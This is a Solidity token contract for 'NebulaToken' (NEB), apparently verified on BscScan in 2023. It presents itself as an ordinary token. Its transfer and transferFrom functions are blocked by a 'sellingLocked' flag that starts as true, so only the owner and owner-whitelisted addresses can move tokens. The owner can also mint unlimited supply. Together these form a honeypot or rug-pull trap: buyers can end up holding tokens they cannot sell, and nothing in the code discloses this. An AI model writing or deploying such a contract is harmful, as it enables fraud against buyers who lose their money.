/**
 *Submitted for verification at BscScan.com on 2023-03-10
*/

// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

contract NebulaToken {
    string public name = "NebulaToken";
    string public symbol = "NEB";
    uint256 public totalSupply = 10000000000 * 10 ** 18;
    mapping(address => uint256) public balanceOf;
    mapping(address => mapping(address => uint256)) public allowance;
    address public owner;
    bool public sellingLocked = true;
    mapping(address => bool) public whiteList;

    // Added events
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);
    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);
    event Burn(address indexed from, uint256 value);
    event AirDrop(address indexed from, address[] indexed receivers, uint256[] indexed values);
    event Mint(address indexed to, uint256 value);

    // Added modifiers
    modifier onlyOwner() {
        require(msg.sender == owner, "Not owner");
        _;
    }

    modifier isSellOpen() {
        require(!sellingLocked || msg.sender == owner || whiteList[msg.sender], "Selling is locked");
        _;
    }

    constructor() {
        owner = msg.sender;
        balanceOf[msg.sender] = totalSupply;
    }

    // Added function to perform an airdrop to a list of addresses
    function airDrop(address[] memory receivers, uint256[] memory values) public onlyOwner returns (bool success) {
        require(receivers.length == values.length, "Invalid input");
        for (uint256 i = 0; i < receivers.length; i++) {
            transfer(receivers[i], values[i]);
        }
        emit AirDrop(msg.sender, receivers, values);
        return true;
    }

    function transfer(address to, uint256 value) public isSellOpen returns (bool success) {
        require(balanceOf[msg.sender] >= value, "Insufficient balance");
        balanceOf[msg.sender] -= value;
        balanceOf[to] += value;
        emit Transfer(msg.sender, to, value);
        return true;
    }

    function approve(address spender, uint256 value) public returns (bool success) {
        allowance[msg.sender][spender] = value;
        emit Approval(msg.sender, spender, value);
        return true;
    }

    function transferFrom(address from, address to, uint256 value) public isSellOpen returns (bool success) {
        require(balanceOf[from] >= value, "Insufficient balance");
        require(allowance[from][msg.sender] >= value, "Allowance exceeded");
        balanceOf[from] -= value;
        balanceOf[to] += value;
        allowance[from][msg.sender] -= value;
        emit Transfer(from, to, value);
        return true;
    }

    function setLock(bool lock) external onlyOwner {
        sellingLocked = lock;
    }

    function addToWhiteList(address _address) external onlyOwner {
        whiteList[_address] = true;
    }

    function removeFromWhiteList(address _address) external onlyOwner {
        whiteList[_address] = false;
    }

    // Added function to transfer ownership of the contract
    function transferOwnership(address newOwner) external onlyOwner {
        require(newOwner != address(0), "Invalid address");
        emit OwnershipTransferred(owner, newOwner);
        owner = newOwner;
    }

    function burn(uint256 value) external onlyOwner {
        require(balanceOf[msg.sender] >= value, "Insufficient balance");
        balanceOf[msg.sender] -= value;
        totalSupply -= value;
        emit Burn(msg.sender, value);
    }

   //ADDED MINT FUNCTION 

    function mint(address to, uint256 amount) public onlyOwner returns (bool) {
    balanceOf[to] += amount;
    totalSupply += amount;
    emit Mint(to, amount);
    return true;
    }
}